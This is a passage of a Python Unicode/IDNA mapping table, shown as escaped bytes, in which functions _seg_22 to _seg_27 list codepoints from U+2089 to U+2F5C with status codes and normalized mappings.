\'8\'),\n    (0x2089, \'M\', \'9\'),\n    (0x208A, \'3\', \'+\'),\n    (0x208B, \'M\', \'\xe2\x88\x92\'),\n    (0x208C, \'3\', \'=\'),\n    (0x208D, \'3\', \'(\'),\n    (0x208E, \'3\', \')\'),\n    (0x208F, \'X\'),\n    (0x2090, \'M\', \'a\'),\n    (0x2091, \'M\', \'e\'),\n    (0x2092, \'M\', \'o\'),\n    (0x2093, \'M\', \'x\'),\n    (0x2094, \'M\', \'\xc9\x99\'),\n    (0x2095, \'M\', \'h\'),\n    (0x2096, \'M\', \'k\'),\n    (0x2097, \'M\', \'l\'),\n    (0x2098, \'M\', \'m\'),\n    (0x2099, \'M\', \'n\'),\n    (0x209A, \'M\', \'p\'),\n    (0x209B, \'M\', \'s\'),\n    (0x209C, \'M\', \'t\'),\n    (0x209D, \'X\'),\n    (0x20A0, \'V\'),\n    (0x20A8, \'M\', \'rs\'),\n    (0x20A9, \'V\'),\n    (0x20C1, \'X\'),\n    (0x20D0, \'V\'),\n    (0x20F1, \'X\'),\n    (0x2100, \'3\', \'a/c\'),\n    (0x2101, \'3\', \'a/s\'),\n    (0x2102, \'M\', \'c\'),\n    (0x2103, \'M\', \'\xc2\xb0c\'),\n    (0x2104, \'V\'),\n    ]\n\ndef _seg_22() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x2105, \'3\', \'c/o\'),\n    (0x2106, \'3\', \'c/u\'),\n    (0x2107, \'M\', \'\xc9\x9b\'),\n    (0x2108, \'V\'),\n    (0x2109, \'M\', \'\xc2\xb0f\'),\n    (0x210A, \'M\', \'g\'),\n    (0x210B, \'M\', \'h\'),\n    (0x210F, \'M\', \'\xc4\xa7\'),\n    (0x2110, \'M\', \'i\'),\n    (0x2112, \'M\', \'l\'),\n    (0x2114, \'V\'),\n    (0x2115, \'M\', \'n\'),\n    (0x2116, \'M\', \'no\'),\n    (0x2117, \'V\'),\n    (0x2119, \'M\', \'p\'),\n    (0x211A, \'M\', \'q\'),\n    (0x211B, \'M\', \'r\'),\n    (0x211E, \'V\'),\n    (0x2120, \'M\', \'sm\'),\n    (0x2121, \'M\', \'tel\'),\n    (0x2122, \'M\', \'tm\'),\n    (0x2123, \'V\'),\n    (0x2124, \'M\', \'z\'),\n    (0x2125, \'V\'),\n    (0x2126, \'M\', \'\xcf\x89\'),\n    (0x2127, \'V\'),\n    (0x2128, \'M\', \'z\'),\n    (0x2129, \'V\'),\n    (0x212A, \'M\', \'k\'),\n    (0x212B, \'M\', \'\xc3\xa5\'),\n    (0x212C, \'M\', \'b\'),\n    (0x212D, \'M\', \'c\'),\n    (0x212E, \'V\'),\n    (0x212F, \'M\', \'e\'),\n    (0x2131, \'M\', \'f\'),\n    (0x2132, \'X\'),\n    (0x2133, \'M\', \'m\'),\n    (0x2134, \'M\', \'o\'),\n    (0x2135, \'M\', \'\xd7\x90\'),\n    (0x2136, \'M\', \'\xd7\x91\'),\n    (0x2137, \'M\', \'\xd7\x92\'),\n    (0x2138, \'M\', \'\xd7\x93\'),\n    (0x2139, \'M\', \'i\'),\n    (0x213A, \'V\'),\n    (0x213B, \'M\', \'fax\'),\n    (0x213C, \'M\', \'\xcf\x80\'),\n    (0x213D, \'M\', \'\xce\xb3\'),\n    (0x213F, \'M\', \'\xcf\x80\'),\n    (0x2140, \'M\', \'\xe2\x88\x91\'),\n    (0x2141, \'V\'),\n    (0x2145, \'M\', \'d\'),\n    (0x2147, \'M\', \'e\'),\n    (0x2148, \'M\', \'i\'),\n    (0x2149, \'M\', \'j\'),\n    (0x214A, \'V\'),\n    (0x2150, \'M\', \'1\xe2\x81\x847\'),\n    (0x2151, \'M\', \'1\xe2\x81\x849\'),\n    (0x2152, \'M\', \'1\xe2\x81\x8410\'),\n    (0x2153, \'M\', \'1\xe2\x81\x843\'),\n    (0x2154, \'M\', \'2\xe2\x81\x843\'),\n    (0x2155, \'M\', \'1\xe2\x81\x845\'),\n    (0x2156, \'M\', \'2\xe2\x81\x845\'),\n    (0x2157, \'M\', \'3\xe2\x81\x845\'),\n    (0x2158, \'M\', \'4\xe2\x81\x845\'),\n    (0x2159, \'M\', \'1\xe2\x81\x846\'),\n    (0x215A, \'M\', \'5\xe2\x81\x846\'),\n    (0x215B, \'M\', \'1\xe2\x81\x848\'),\n    (0x215C, \'M\', \'3\xe2\x81\x848\'),\n    (0x215D, \'M\', \'5\xe2\x81\x848\'),\n    (0x215E, \'M\', \'7\xe2\x81\x848\'),\n    (0x215F, \'M\', \'1\xe2\x81\x84\'),\n    (0x2160, \'M\', \'i\'),\n    (0x2161, \'M\', \'ii\'),\n    (0x2162, \'M\', \'iii\'),\n    (0x2163, \'M\', \'iv\'),\n    (0x2164, \'M\', \'v\'),\n    (0x2165, \'M\', \'vi\'),\n    (0x2166, \'M\', \'vii\'),\n    (0x2167, \'M\', \'viii\'),\n    (0x2168, \'M\', \'ix\'),\n    (0x2169, \'M\', \'x\'),\n    (0x216A, \'M\', \'xi\'),\n    (0x216B, \'M\', \'xii\'),\n    (0x216C, \'M\', \'l\'),\n    (0x216D, \'M\', \'c\'),\n    (0x216E, \'M\', \'d\'),\n    (0x216F, \'M\', \'m\'),\n    (0x2170, \'M\', \'i\'),\n    (0x2171, \'M\', \'ii\'),\n    (0x2172, \'M\', \'iii\'),\n    (0x2173, \'M\', \'iv\'),\n    (0x2174, \'M\', \'v\'),\n    (0x2175, \'M\', \'vi\'),\n    (0x2176, \'M\', \'vii\'),\n    (0x2177, \'M\', \'viii\'),\n    (0x2178, \'M\', \'ix\'),\n    (0x2179, \'M\', \'x\'),\n    (0x217A, \'M\', \'xi\'),\n    (0x217B, \'M\', \'xii\'),\n    (0x217C, \'M\', \'l\'),\n    ]\n\ndef _seg_23() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x217D, \'M\', \'c\'),\n    (0x217E, \'M\', \'d\'),\n    (0x217F, \'M\', \'m\'),\n    (0x2180, \'V\'),\n    (0x2183, \'X\'),\n    (0x2184, \'V\'),\n    (0x2189, \'M\', \'0\xe2\x81\x843\'),\n    (0x218A, \'V\'),\n    (0x218C, \'X\'),\n    (0x2190, \'V\'),\n    (0x222C, \'M\', \'\xe2\x88\xab\xe2\x88\xab\'),\n    (0x222D, \'M\', \'\xe2\x88\xab\xe2\x88\xab\xe2\x88\xab\'),\n    (0x222E, \'V\'),\n    (0x222F, \'M\', \'\xe2\x88\xae\xe2\x88\xae\'),\n    (0x2230, \'M\', \'\xe2\x88\xae\xe2\x88\xae\xe2\x88\xae\'),\n    (0x2231, \'V\'),\n    (0x2260, \'3\'),\n    (0x2261, \'V\'),\n    (0x226E, \'3\'),\n    (0x2270, \'V\'),\n    (0x2329, \'M\', \'\xe3\x80\x88\'),\n    (0x232A, \'M\', \'\xe3\x80\x89\'),\n    (0x232B, \'V\'),\n    (0x2427, \'X\'),\n    (0x2440, \'V\'),\n    (0x244B, \'X\'),\n    (0x2460, \'M\', \'1\'),\n    (0x2461, \'M\', \'2\'),\n    (0x2462, \'M\', \'3\'),\n    (0x2463, \'M\', \'4\'),\n    (0x2464, \'M\', \'5\'),\n    (0x2465, \'M\', \'6\'),\n    (0x2466, \'M\', \'7\'),\n    (0x2467, \'M\', \'8\'),\n    (0x2468, \'M\', \'9\'),\n    (0x2469, \'M\', \'10\'),\n    (0x246A, \'M\', \'11\'),\n    (0x246B, \'M\', \'12\'),\n    (0x246C, \'M\', \'13\'),\n    (0x246D, \'M\', \'14\'),\n    (0x246E, \'M\', \'15\'),\n    (0x246F, \'M\', \'16\'),\n    (0x2470, \'M\', \'17\'),\n    (0x2471, \'M\', \'18\'),\n    (0x2472, \'M\', \'19\'),\n    (0x2473, \'M\', \'20\'),\n    (0x2474, \'3\', \'(1)\'),\n    (0x2475, \'3\', \'(2)\'),\n    (0x2476, \'3\', \'(3)\'),\n    (0x2477, \'3\', \'(4)\'),\n    (0x2478, \'3\', \'(5)\'),\n    (0x2479, \'3\', \'(6)\'),\n    (0x247A, \'3\', \'(7)\'),\n    (0x247B, \'3\', \'(8)\'),\n    (0x247C, \'3\', \'(9)\'),\n    (0x247D, \'3\', \'(10)\'),\n    (0x247E, \'3\', \'(11)\'),\n    (0x247F, \'3\', \'(12)\'),\n    (0x2480, \'3\', \'(13)\'),\n    (0x2481, \'3\', \'(14)\'),\n    (0x2482, \'3\', \'(15)\'),\n    (0x2483, \'3\', \'(16)\'),\n    (0x2484, \'3\', \'(17)\'),\n    (0x2485, \'3\', \'(18)\'),\n    (0x2486, \'3\', \'(19)\'),\n    (0x2487, \'3\', \'(20)\'),\n    (0x2488, \'X\'),\n    (0x249C, \'3\', \'(a)\'),\n    (0x249D, \'3\', \'(b)\'),\n    (0x249E, \'3\', \'(c)\'),\n    (0x249F, \'3\', \'(d)\'),\n    (0x24A0, \'3\', \'(e)\'),\n    (0x24A1, \'3\', \'(f)\'),\n    (0x24A2, \'3\', \'(g)\'),\n    (0x24A3, \'3\', \'(h)\'),\n    (0x24A4, \'3\', \'(i)\'),\n    (0x24A5, \'3\', \'(j)\'),\n    (0x24A6, \'3\', \'(k)\'),\n    (0x24A7, \'3\', \'(l)\'),\n    (0x24A8, \'3\', \'(m)\'),\n    (0x24A9, \'3\', \'(n)\'),\n    (0x24AA, \'3\', \'(o)\'),\n    (0x24AB, \'3\', \'(p)\'),\n    (0x24AC, \'3\', \'(q)\'),\n    (0x24AD, \'3\', \'(r)\'),\n    (0x24AE, \'3\', \'(s)\'),\n    (0x24AF, \'3\', \'(t)\'),\n    (0x24B0, \'3\', \'(u)\'),\n    (0x24B1, \'3\', \'(v)\'),\n    (0x24B2, \'3\', \'(w)\'),\n    (0x24B3, \'3\', \'(x)\'),\n    (0x24B4, \'3\', \'(y)\'),\n    (0x24B5, \'3\', \'(z)\'),\n    (0x24B6, \'M\', \'a\'),\n    (0x24B7, \'M\', \'b\'),\n    (0x24B8, \'M\', \'c\'),\n    (0x24B9, \'M\', \'d\'),\n    (0x24BA, \'M\', \'e\'),\n    (0x24BB, \'M\', \'f\'),\n    (0x24BC, \'M\', \'g\'),\n    ]\n\ndef _seg_24() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x24BD, \'M\', \'h\'),\n    (0x24BE, \'M\', \'i\'),\n    (0x24BF, \'M\', \'j\'),\n    (0x24C0, \'M\', \'k\'),\n    (0x24C1, \'M\', \'l\'),\n    (0x24C2, \'M\', \'m\'),\n    (0x24C3, \'M\', \'n\'),\n    (0x24C4, \'M\', \'o\'),\n    (0x24C5, \'M\', \'p\'),\n    (0x24C6, \'M\', \'q\'),\n    (0x24C7, \'M\', \'r\'),\n    (0x24C8, \'M\', \'s\'),\n    (0x24C9, \'M\', \'t\'),\n    (0x24CA, \'M\', \'u\'),\n    (0x24CB, \'M\', \'v\'),\n    (0x24CC, \'M\', \'w\'),\n    (0x24CD, \'M\', \'x\'),\n    (0x24CE, \'M\', \'y\'),\n    (0x24CF, \'M\', \'z\'),\n    (0x24D0, \'M\', \'a\'),\n    (0x24D1, \'M\', \'b\'),\n    (0x24D2, \'M\', \'c\'),\n    (0x24D3, \'M\', \'d\'),\n    (0x24D4, \'M\', \'e\'),\n    (0x24D5, \'M\', \'f\'),\n    (0x24D6, \'M\', \'g\'),\n    (0x24D7, \'M\', \'h\'),\n    (0x24D8, \'M\', \'i\'),\n    (0x24D9, \'M\', \'j\'),\n    (0x24DA, \'M\', \'k\'),\n    (0x24DB, \'M\', \'l\'),\n    (0x24DC, \'M\', \'m\'),\n    (0x24DD, \'M\', \'n\'),\n    (0x24DE, \'M\', \'o\'),\n    (0x24DF, \'M\', \'p\'),\n    (0x24E0, \'M\', \'q\'),\n    (0x24E1, \'M\', \'r\'),\n    (0x24E2, \'M\', \'s\'),\n    (0x24E3, \'M\', \'t\'),\n    (0x24E4, \'M\', \'u\'),\n    (0x24E5, \'M\', \'v\'),\n    (0x24E6, \'M\', \'w\'),\n    (0x24E7, \'M\', \'x\'),\n    (0x24E8, \'M\', \'y\'),\n    (0x24E9, \'M\', \'z\'),\n    (0x24EA, \'M\', \'0\'),\n    (0x24EB, \'V\'),\n    (0x2A0C, \'M\', \'\xe2\x88\xab\xe2\x88\xab\xe2\x88\xab\xe2\x88\xab\'),\n    (0x2A0D, \'V\'),\n    (0x2A74, \'3\', \'::=\'),\n    (0x2A75, \'3\', \'==\'),\n    (0x2A76, \'3\', \'===\'),\n    (0x2A77, \'V\'),\n    (0x2ADC, \'M\', \'\xe2\xab\x9d\xcc\xb8\'),\n    (0x2ADD, \'V\'),\n    (0x2B74, \'X\'),\n    (0x2B76, \'V\'),\n    (0x2B96, \'X\'),\n    (0x2B97, \'V\'),\n    (0x2C00, \'M\', \'\xe2\xb0\xb0\'),\n    (0x2C01, \'M\', \'\xe2\xb0\xb1\'),\n    (0x2C02, \'M\', \'\xe2\xb0\xb2\'),\n    (0x2C03, \'M\', \'\xe2\xb0\xb3\'),\n    (0x2C04, \'M\', \'\xe2\xb0\xb4\'),\n    (0x2C05, \'M\', \'\xe2\xb0\xb5\'),\n    (0x2C06, \'M\', \'\xe2\xb0\xb6\'),\n    (0x2C07, \'M\', \'\xe2\xb0\xb7\'),\n    (0x2C08, \'M\', \'\xe2\xb0\xb8\'),\n    (0x2C09, \'M\', \'\xe2\xb0\xb9\'),\n    (0x2C0A, \'M\', \'\xe2\xb0\xba\'),\n    (0x2C0B, \'M\', \'\xe2\xb0\xbb\'),\n    (0x2C0C, \'M\', \'\xe2\xb0\xbc\'),\n    (0x2C0D, \'M\', \'\xe2\xb0\xbd\'),\n    (0x2C0E, \'M\', \'\xe2\xb0\xbe\'),\n    (0x2C0F, \'M\', \'\xe2\xb0\xbf\'),\n    (0x2C10, \'M\', \'\xe2\xb1\x80\'),\n    (0x2C11, \'M\', \'\xe2\xb1\x81\'),\n    (0x2C12, \'M\', \'\xe2\xb1\x82\'),\n    (0x2C13, \'M\', \'\xe2\xb1\x83\'),\n    (0x2C14, \'M\', \'\xe2\xb1\x84\'),\n    (0x2C15, \'M\', \'\xe2\xb1\x85\'),\n    (0x2C16, \'M\', \'\xe2\xb1\x86\'),\n    (0x2C17, \'M\', \'\xe2\xb1\x87\'),\n    (0x2C18, \'M\', \'\xe2\xb1\x88\'),\n    (0x2C19, \'M\', \'\xe2\xb1\x89\'),\n    (0x2C1A, \'M\', \'\xe2\xb1\x8a\'),\n    (0x2C1B, \'M\', \'\xe2\xb1\x8b\'),\n    (0x2C1C, \'M\', \'\xe2\xb1\x8c\'),\n    (0x2C1D, \'M\', \'\xe2\xb1\x8d\'),\n    (0x2C1E, \'M\', \'\xe2\xb1\x8e\'),\n    (0x2C1F, \'M\', \'\xe2\xb1\x8f\'),\n    (0x2C20, \'M\', \'\xe2\xb1\x90\'),\n    (0x2C21, \'M\', \'\xe2\xb1\x91\'),\n    (0x2C22, \'M\', \'\xe2\xb1\x92\'),\n    (0x2C23, \'M\', \'\xe2\xb1\x93\'),\n    (0x2C24, \'M\', \'\xe2\xb1\x94\'),\n    (0x2C25, \'M\', \'\xe2\xb1\x95\'),\n    (0x2C26, \'M\', \'\xe2\xb1\x96\'),\n    (0x2C27, \'M\', \'\xe2\xb1\x97\'),\n    (0x2C28, \'M\', \'\xe2\xb1\x98\'),\n    ]\n\ndef _seg_25() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x2C29, \'M\', \'\xe2\xb1\x99\'),\n    (0x2C2A, \'M\', \'\xe2\xb1\x9a\'),\n    (0x2C2B, \'M\', \'\xe2\xb1\x9b\'),\n    (0x2C2C, \'M\', \'\xe2\xb1\x9c\'),\n    (0x2C2D, \'M\', \'\xe2\xb1\x9d\'),\n    (0x2C2E, \'M\', \'\xe2\xb1\x9e\'),\n    (0x2C2F, \'M\', \'\xe2\xb1\x9f\'),\n    (0x2C30, \'V\'),\n    (0x2C60, \'M\', \'\xe2\xb1\xa1\'),\n    (0x2C61, \'V\'),\n    (0x2C62, \'M\', \'\xc9\xab\'),\n    (0x2C63, \'M\', \'\xe1\xb5\xbd\'),\n    (0x2C64, \'M\', \'\xc9\xbd\'),\n    (0x2C65, \'V\'),\n    (0x2C67, \'M\', \'\xe2\xb1\xa8\'),\n    (0x2C68, \'V\'),\n    (0x2C69, \'M\', \'\xe2\xb1\xaa\'),\n    (0x2C6A, \'V\'),\n    (0x2C6B, \'M\', \'\xe2\xb1\xac\'),\n    (0x2C6C, \'V\'),\n    (0x2C6D, \'M\', \'\xc9\x91\'),\n    (0x2C6E, \'M\', \'\xc9\xb1\'),\n    (0x2C6F, \'M\', \'\xc9\x90\'),\n    (0x2C70, \'M\', \'\xc9\x92\'),\n    (0x2C71, \'V\'),\n    (0x2C72, \'M\', \'\xe2\xb1\xb3\'),\n    (0x2C73, \'V\'),\n    (0x2C75, \'M\', \'\xe2\xb1\xb6\'),\n    (0x2C76, \'V\'),\n    (0x2C7C, \'M\', \'j\'),\n    (0x2C7D, \'M\', \'v\'),\n    (0x2C7E, \'M\', \'\xc8\xbf\'),\n    (0x2C7F, \'M\', \'\xc9\x80\'),\n    (0x2C80, \'M\', \'\xe2\xb2\x81\'),\n    (0x2C81, \'V\'),\n    (0x2C82, \'M\', \'\xe2\xb2\x83\'),\n    (0x2C83, \'V\'),\n    (0x2C84, \'M\', \'\xe2\xb2\x85\'),\n    (0x2C85, \'V\'),\n    (0x2C86, \'M\', \'\xe2\xb2\x87\'),\n    (0x2C87, \'V\'),\n    (0x2C88, \'M\', \'\xe2\xb2\x89\'),\n    (0x2C89, \'V\'),\n    (0x2C8A, \'M\', \'\xe2\xb2\x8b\'),\n    (0x2C8B, \'V\'),\n    (0x2C8C, \'M\', \'\xe2\xb2\x8d\'),\n    (0x2C8D, \'V\'),\n    (0x2C8E, \'M\', \'\xe2\xb2\x8f\'),\n    (0x2C8F, \'V\'),\n    (0x2C90, \'M\', \'\xe2\xb2\x91\'),\n    (0x2C91, \'V\'),\n    (0x2C92, \'M\', \'\xe2\xb2\x93\'),\n    (0x2C93, \'V\'),\n    (0x2C94, \'M\', \'\xe2\xb2\x95\'),\n    (0x2C95, \'V\'),\n    (0x2C96, \'M\', \'\xe2\xb2\x97\'),\n    (0x2C97, \'V\'),\n    (0x2C98, \'M\', \'\xe2\xb2\x99\'),\n    (0x2C99, \'V\'),\n    (0x2C9A, \'M\', \'\xe2\xb2\x9b\'),\n    (0x2C9B, \'V\'),\n    (0x2C9C, \'M\', \'\xe2\xb2\x9d\'),\n    (0x2C9D, \'V\'),\n    (0x2C9E, \'M\', \'\xe2\xb2\x9f\'),\n    (0x2C9F, \'V\'),\n    (0x2CA0, \'M\', \'\xe2\xb2\xa1\'),\n    (0x2CA1, \'V\'),\n    (0x2CA2, \'M\', \'\xe2\xb2\xa3\'),\n    (0x2CA3, \'V\'),\n    (0x2CA4, \'M\', \'\xe2\xb2\xa5\'),\n    (0x2CA5, \'V\'),\n    (0x2CA6, \'M\', \'\xe2\xb2\xa7\'),\n    (0x2CA7, \'V\'),\n    (0x2CA8, \'M\', \'\xe2\xb2\xa9\'),\n    (0x2CA9, \'V\'),\n    (0x2CAA, \'M\', \'\xe2\xb2\xab\'),\n    (0x2CAB, \'V\'),\n    (0x2CAC, \'M\', \'\xe2\xb2\xad\'),\n    (0x2CAD, \'V\'),\n    (0x2CAE, \'M\', \'\xe2\xb2\xaf\'),\n    (0x2CAF, \'V\'),\n    (0x2CB0, \'M\', \'\xe2\xb2\xb1\'),\n    (0x2CB1, \'V\'),\n    (0x2CB2, \'M\', \'\xe2\xb2\xb3\'),\n    (0x2CB3, \'V\'),\n    (0x2CB4, \'M\', \'\xe2\xb2\xb5\'),\n    (0x2CB5, \'V\'),\n    (0x2CB6, \'M\', \'\xe2\xb2\xb7\'),\n    (0x2CB7, \'V\'),\n    (0x2CB8, \'M\', \'\xe2\xb2\xb9\'),\n    (0x2CB9, \'V\'),\n    (0x2CBA, \'M\', \'\xe2\xb2\xbb\'),\n    (0x2CBB, \'V\'),\n    (0x2CBC, \'M\', \'\xe2\xb2\xbd\'),\n    (0x2CBD, \'V\'),\n    (0x2CBE, \'M\', \'\xe2\xb2\xbf\'),\n    (0x2CBF, \'V\'),\n    (0x2CC0, \'M\', \'\xe2\xb3\x81\'),\n    (0x2CC1, \'V\'),\n    (0x2CC2, \'M\', \'\xe2\xb3\x83\'),\n    ]\n\ndef _seg_26() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x2CC3, \'V\'),\n    (0x2CC4, \'M\', \'\xe2\xb3\x85\'),\n    (0x2CC5, \'V\'),\n    (0x2CC6, \'M\', \'\xe2\xb3\x87\'),\n    (0x2CC7, \'V\'),\n    (0x2CC8, \'M\', \'\xe2\xb3\x89\'),\n    (0x2CC9, \'V\'),\n    (0x2CCA, \'M\', \'\xe2\xb3\x8b\'),\n    (0x2CCB, \'V\'),\n    (0x2CCC, \'M\', \'\xe2\xb3\x8d\'),\n    (0x2CCD, \'V\'),\n    (0x2CCE, \'M\', \'\xe2\xb3\x8f\'),\n    (0x2CCF, \'V\'),\n    (0x2CD0, \'M\', \'\xe2\xb3\x91\'),\n    (0x2CD1, \'V\'),\n    (0x2CD2, \'M\', \'\xe2\xb3\x93\'),\n    (0x2CD3, \'V\'),\n    (0x2CD4, \'M\', \'\xe2\xb3\x95\'),\n    (0x2CD5, \'V\'),\n    (0x2CD6, \'M\', \'\xe2\xb3\x97\'),\n    (0x2CD7, \'V\'),\n    (0x2CD8, \'M\', \'\xe2\xb3\x99\'),\n    (0x2CD9, \'V\'),\n    (0x2CDA, \'M\', \'\xe2\xb3\x9b\'),\n    (0x2CDB, \'V\'),\n    (0x2CDC, \'M\', \'\xe2\xb3\x9d\'),\n    (0x2CDD, \'V\'),\n    (0x2CDE, \'M\', \'\xe2\xb3\x9f\'),\n    (0x2CDF, \'V\'),\n    (0x2CE0, \'M\', \'\xe2\xb3\xa1\'),\n    (0x2CE1, \'V\'),\n    (0x2CE2, \'M\', \'\xe2\xb3\xa3\'),\n    (0x2CE3, \'V\'),\n    (0x2CEB, \'M\', \'\xe2\xb3\xac\'),\n    (0x2CEC, \'V\'),\n    (0x2CED, \'M\', \'\xe2\xb3\xae\'),\n    (0x2CEE, \'V\'),\n    (0x2CF2, \'M\', \'\xe2\xb3\xb3\'),\n    (0x2CF3, \'V\'),\n    (0x2CF4, \'X\'),\n    (0x2CF9, \'V\'),\n    (0x2D26, \'X\'),\n    (0x2D27, \'V\'),\n    (0x2D28, \'X\'),\n    (0x2D2D, \'V\'),\n    (0x2D2E, \'X\'),\n    (0x2D30, \'V\'),\n    (0x2D68, \'X\'),\n    (0x2D6F, \'M\', \'\xe2\xb5\xa1\'),\n    (0x2D70, \'V\'),\n    (0x2D71, \'X\'),\n    (0x2D7F, \'V\'),\n    (0x2D97, \'X\'),\n    (0x2DA0, \'V\'),\n    (0x2DA7, \'X\'),\n    (0x2DA8, \'V\'),\n    (0x2DAF, \'X\'),\n    (0x2DB0, \'V\'),\n    (0x2DB7, \'X\'),\n    (0x2DB8, \'V\'),\n    (0x2DBF, \'X\'),\n    (0x2DC0, \'V\'),\n    (0x2DC7, \'X\'),\n    (0x2DC8, \'V\'),\n    (0x2DCF, \'X\'),\n    (0x2DD0, \'V\'),\n    (0x2DD7, \'X\'),\n    (0x2DD8, \'V\'),\n    (0x2DDF, \'X\'),\n    (0x2DE0, \'V\'),\n    (0x2E5E, \'X\'),\n    (0x2E80, \'V\'),\n    (0x2E9A, \'X\'),\n    (0x2E9B, \'V\'),\n    (0x2E9F, \'M\', \'\xe6\xaf\x8d\'),\n    (0x2EA0, \'V\'),\n    (0x2EF3, \'M\', \'\xe9\xbe\x9f\'),\n    (0x2EF4, \'X\'),\n    (0x2F00, \'M\', \'\xe4\xb8\x80\'),\n    (0x2F01, \'M\', \'\xe4\xb8\xa8\'),\n    (0x2F02, \'M\', \'\xe4\xb8\xb6\'),\n    (0x2F03, \'M\', \'\xe4\xb8\xbf\'),\n    (0x2F04, \'M\', \'\xe4\xb9\x99\'),\n    (0x2F05, \'M\', \'\xe4\xba\x85\'),\n    (0x2F06, \'M\', \'\xe4\xba\x8c\'),\n    (0x2F07, \'M\', \'\xe4\xba\xa0\'),\n    (0x2F08, \'M\', \'\xe4\xba\xba\'),\n    (0x2F09, \'M\', \'\xe5\x84\xbf\'),\n    (0x2F0A, \'M\', \'\xe5\x85\xa5\'),\n    (0x2F0B, \'M\', \'\xe5\x85\xab\'),\n    (0x2F0C, \'M\', \'\xe5\x86\x82\'),\n    (0x2F0D, \'M\', \'\xe5\x86\x96\'),\n    (0x2F0E, \'M\', \'\xe5\x86\xab\'),\n    (0x2F0F, \'M\', \'\xe5\x87\xa0\'),\n    (0x2F10, \'M\', \'\xe5\x87\xb5\'),\n    (0x2F11, \'M\', \'\xe5\x88\x80\'),\n    (0x2F12, \'M\', \'\xe5\x8a\x9b\'),\n    (0x2F13, \'M\', \'\xe5\x8b\xb9\'),\n    (0x2F14, \'M\', \'\xe5\x8c\x95\'),\n    (0x2F15, \'M\', \'\xe5\x8c\x9a\'),\n    ]\n\ndef _seg_27() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x2F16, \'M\', \'\xe5\x8c\xb8\'),\n    (0x2F17, \'M\', \'\xe5\x8d\x81\'),\n    (0x2F18, \'M\', \'\xe5\x8d\x9c\'),\n    (0x2F19, \'M\', \'\xe5\x8d\xa9\'),\n    (0x2F1A, \'M\', \'\xe5\x8e\x82\'),\n    (0x2F1B, \'M\', \'\xe5\x8e\xb6\'),\n    (0x2F1C, \'M\', \'\xe5\x8f\x88\'),\n    (0x2F1D, \'M\', \'\xe5\x8f\xa3\'),\n    (0x2F1E, \'M\', \'\xe5\x9b\x97\'),\n    (0x2F1F, \'M\', \'\xe5\x9c\x9f\'),\n    (0x2F20, \'M\', \'\xe5\xa3\xab\'),\n    (0x2F21, \'M\', \'\xe5\xa4\x82\'),\n    (0x2F22, \'M\', \'\xe5\xa4\x8a\'),\n    (0x2F23, \'M\', \'\xe5\xa4\x95\'),\n    (0x2F24, \'M\', \'\xe5\xa4\xa7\'),\n    (0x2F25, \'M\', \'\xe5\xa5\xb3\'),\n    (0x2F26, \'M\', \'\xe5\xad\x90\'),\n    (0x2F27, \'M\', \'\xe5\xae\x80\'),\n    (0x2F28, \'M\', \'\xe5\xaf\xb8\'),\n    (0x2F29, \'M\', \'\xe5\xb0\x8f\'),\n    (0x2F2A, \'M\', \'\xe5\xb0\xa2\'),\n    (0x2F2B, \'M\', \'\xe5\xb0\xb8\'),\n    (0x2F2C, \'M\', \'\xe5\xb1\xae\'),\n    (0x2F2D, \'M\', \'\xe5\xb1\xb1\'),\n    (0x2F2E, \'M\', \'\xe5\xb7\x9b\'),\n    (0x2F2F, \'M\', \'\xe5\xb7\xa5\'),\n    (0x2F30, \'M\', \'\xe5\xb7\xb1\'),\n    (0x2F31, \'M\', \'\xe5\xb7\xbe\'),\n    (0x2F32, \'M\', \'\xe5\xb9\xb2\'),\n    (0x2F33, \'M\', \'\xe5\xb9\xba\'),\n    (0x2F34, \'M\', \'\xe5\xb9\xbf\'),\n    (0x2F35, \'M\', \'\xe5\xbb\xb4\'),\n    (0x2F36, \'M\', \'\xe5\xbb\xbe\'),\n    (0x2F37, \'M\', \'\xe5\xbc\x8b\'),\n    (0x2F38, \'M\', \'\xe5\xbc\x93\'),\n    (0x2F39, \'M\', \'\xe5\xbd\x90\'),\n    (0x2F3A, \'M\', \'\xe5\xbd\xa1\'),\n    (0x2F3B, \'M\', \'\xe5\xbd\xb3\'),\n    (0x2F3C, \'M\', \'\xe5\xbf\x83\'),\n    (0x2F3D, \'M\', \'\xe6\x88\x88\'),\n    (0x2F3E, \'M\', \'\xe6\x88\xb6\'),\n    (0x2F3F, \'M\', \'\xe6\x89\x8b\'),\n    (0x2F40, \'M\', \'\xe6\x94\xaf\'),\n    (0x2F41, \'M\', \'\xe6\x94\xb4\'),\n    (0x2F42, \'M\', \'\xe6\x96\x87\'),\n    (0x2F43, \'M\', \'\xe6\x96\x97\'),\n    (0x2F44, \'M\', \'\xe6\x96\xa4\'),\n    (0x2F45, \'M\', \'\xe6\x96\xb9\'),\n    (0x2F46, \'M\', \'\xe6\x97\xa0\'),\n    (0x2F47, \'M\', \'\xe6\x97\xa5\'),\n    (0x2F48, \'M\', \'\xe6\x9b\xb0\'),\n    (0x2F49, \'M\', \'\xe6\x9c\x88\'),\n    (0x2F4A, \'M\', \'\xe6\x9c\xa8\'),\n    (0x2F4B, \'M\', \'\xe6\xac\xa0\'),\n    (0x2F4C, \'M\', \'\xe6\xad\xa2\'),\n    (0x2F4D, \'M\', \'\xe6\xad\xb9\'),\n    (0x2F4E, \'M\', \'\xe6\xae\xb3\'),\n    (0x2F4F, \'M\', \'\xe6\xaf\x8b\'),\n    (0x2F50, \'M\', \'\xe6\xaf\x94\'),\n    (0x2F51, \'M\', \'\xe6\xaf\x9b\'),\n    (0x2F52, \'M\', \'\xe6\xb0\x8f\'),\n    (0x2F53, \'M\', \'\xe6\xb0\x94\'),\n    (0x2F54, \'M\', \'\xe6\xb0\xb4\'),\n    (0x2F55, \'M\', \'\xe7\x81\xab\'),\n    (0x2F56, \'M\', \'\xe7\x88\xaa\'),\n    (0x2F57, \'M\', \'\xe7\x88\xb6\'),\n    (0x2F58, \'M\', \'\xe7\x88\xbb\'),\n    (0x2F59, \'M\', \'\xe7\x88\xbf\'),\n    (0x2F5A, \'M\', \'\xe7\x89\x87\'),\n    (0x2F5B, \'M\', \'\xe7\x89\x99\'),\n    (0x2F5C, \'M\', \'\xe7\x89\x9b\'),\n    